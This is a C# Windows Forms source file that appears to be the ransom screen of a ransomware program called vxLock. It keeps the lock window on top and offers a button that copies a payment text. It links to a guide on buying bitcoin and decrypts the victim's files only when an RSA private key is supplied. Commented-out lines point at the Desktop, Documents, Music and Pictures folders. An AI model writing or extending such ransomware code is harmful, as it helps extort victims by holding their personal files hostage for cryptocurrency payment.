using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;

namespace vxLock
{

    public partial class Locked : Form
    {
        private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        private const UInt32 SWP_NOSIZE = 0x0001;
        private const UInt32 SWP_NOMOVE = 0x0002;
        private const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;
        private string privKEY = "";

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        public Locked()
        {
            InitializeComponent();
        }

        private string pemprivhead = "-----BEGIN RSA PRIVATE KEY-----";
        protected vxCrypt crypter;
        private Boolean keyloaded = false;

        private void Locked_Load(object sender, EventArgs e)
        {
            makeBold();
            SetWindowPos(Handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS);
        }

        private void makeBold()
        {
            int n1 = 0;
            int n2 = richTextBox1.Text.Length;

            try
            {
                while ((n1 = richTextBox1.Text.IndexOf("[b]", n1)) != -1 && (n2 = richTextBox1.Text.IndexOf("[/b]", n1)) != -1)
                {
                    richTextBox1.Select(n1 + 3, n2 - n1 - 3);
                    using (var boldFont = new Font(richTextBox1.SelectionFont, FontStyle.Bold))
                        richTextBox1.SelectionFont = boldFont;

                    n1 = n2;
                }

                richTextBox1.Rtf = richTextBox1.Rtf.Replace("[b]", string.Empty);
                richTextBox1.Rtf = richTextBox1.Rtf.Replace("[/b]", string.Empty);
            }
            catch { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "Add Key...";
            ofd.Filter = "Key Files|*.pem,*.key| All files|*.*";

           // if (DialogResult.OK == ofd.ShowDialog())

                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                using (StreamReader str = new StreamReader(@ofd.FileName))
                {
                    string fline = str.ReadLine();
                    if (fline.StartsWith(pemprivhead)) privKEY = fline + "\n" + str.ReadToEnd();
                }

                if (privKEY == "")
                {
                    MessageBox.Show("Selected File is not a Private RSA Key!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    return;
                }

                crypter = new vxCrypt(privKEY);

                try
                {
                    byte[] c = crypter.RSA.Encrypt(new byte[] { 0x01, 0x00 }, false);
                    byte[] s = crypter.RSA.Decrypt(c, false);
                }
                catch
                {
                    if (MessageBox.Show("There was an error loading RSA PrivateKey", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error) == System.Windows.Forms.DialogResult.Cancel) Environment.Exit(1);
                    return;
                }

                MessageBox.Show("RSA Key was successfully loaded into program!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                keyloaded = true;

            }

            if (keyloaded)
            {
                Decrypt();
            }
        }



        private void Decrypt()
        {
            if (!keyloaded) return;

            try
            {
                vxFileManager fil = new vxFileManager(crypter);

                fil.decryptDirectory(Environment.CurrentDirectory);
             /*   fil.decryptDirectory((Environment.GetFolderPath(Environment.SpecialFolder.Desktop)));
                fil.decryptDirectory((Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)));
                fil.decryptDirectory((Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)));
                fil.decryptDirectory((Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)));*/

                MessageBox.Show("Files have been decrypted successfully! :)", "VxCrypter", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception excp)
            {
                MessageBox.Show(excp.Message, "Exception", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(textBox1.Text);
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            linkLabel1.LinkVisited = true;
            System.Diagnostics.Process.Start("https://www.investopedia.com/tech/how-to-buy-bitcoin/");
        }
    }
}
